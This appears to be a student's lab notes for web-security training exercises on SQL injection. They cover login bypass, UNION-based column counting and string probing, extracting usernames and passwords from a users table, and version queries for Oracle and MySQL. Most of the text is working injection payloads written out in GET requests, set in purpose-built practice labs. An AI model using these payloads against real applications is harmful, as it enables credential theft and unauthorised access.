# ============================================

# Basic

============================================
Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

# GET /filter?category=Lifestyle'+OR+1=1--

Lab: SQL injection vulnerability allowing login bypass
To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.

# Username: Administrator'--

============================================
SQL injection UNION attacks

For a UNION query to work, two key requirements must be met:

The individual queries must return the same number of columns.
The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

How many columns are being returned from the original query?
Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

The first method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the WHERE clause of the original query, you would submit:

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.
On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like: ' UNION SELECT NULL FROM DUAL--.
The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.

Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

If the data type of a column is not compatible with string data, the injected query will cause a database error

# Database Version

The queries to determine the database version for some popular database types are as follows:

Database type Query
Microsoft, MySQL `SELECT @@version`
Oracle `SELECT * FROM v$version`
PostgreSQL `SELECT version()`
For example, you could use a UNION attack with the following input:

# ' UNION SELECT @@version--

============================================
Lab: SQL injection UNION attack, determining the number of columns returned by the query

To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.

# GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--

Lab: SQL injection UNION attack, finding a column containing text

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

# Number of Columns

GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--

# Identify String Columns

GET /filter?category=Gifts'+UNION+SELECT+NULL,'a',NULL--

# Return Specific String

# GET /filter?category=Gifts'+UNION+SELECT+NULL,'SI0fBf',NULL--

Lab: SQL injection UNION attack, retrieving data from other tables

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

# Number of Columns

GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--

# Extract Usernames and Passwords From Users table

# GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--

Lab: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

# Number of Columns

GET /filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--

# Extract Usernames and Passwords From Users table

# GET /filter?category=Gifts'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--

Lab: SQL injection attack, querying the database type and version on Oracle

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

# Determine Number of Columns using dual table (special built in table for Oracle)

`'+UNION+SELECT+NULL,NULL+FROM+dual--`

# Query to get version info via banner

# `'+UNION+SELECT+BANNER,NULL+FROM+v$version--`

Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

# Determine Number of Columns

`'+UNION+SELECT+NULL,NULL#`

# Query to get version info via banner

# `'+UNION+SELECT+@@version,+NULL#`

# ============================================

# ============================================

# ============================================

# ============================================

# ============================================

# ============================================

============================================
